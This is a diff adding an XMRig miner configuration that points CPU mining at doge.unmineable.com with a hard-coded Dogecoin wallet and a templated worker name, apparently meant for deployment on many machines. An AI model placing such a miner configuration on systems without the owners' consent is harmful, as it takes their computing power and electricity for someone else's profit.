@@ -1,0 +1,26 @@
+{
+  "api": {
+    "id": null,
+    "worker-id": "__WORKER__"
+  },
+  "autosave": true,
+  "background": false,
+  "colors": true,
+  "randomx": {
+    "1gb-pages": false,
+    "rdmsr": true,
+    "wrmsr": true
+  },
+  "donate-level": 0,
+  "log-file": "xmrig.log",
+  "pools": [
+    {
+      "url": "doge.unmineable.com:443",
+      "user": "DOGE:D67sVEQt1BLohAz1zqqodrY9LQ5hieqDaF.__WORKER__",
+      "pass": "x",
+      "keepalive": true,
+      "tls": true
+    }
+  ],
+  "cpu": true
+}
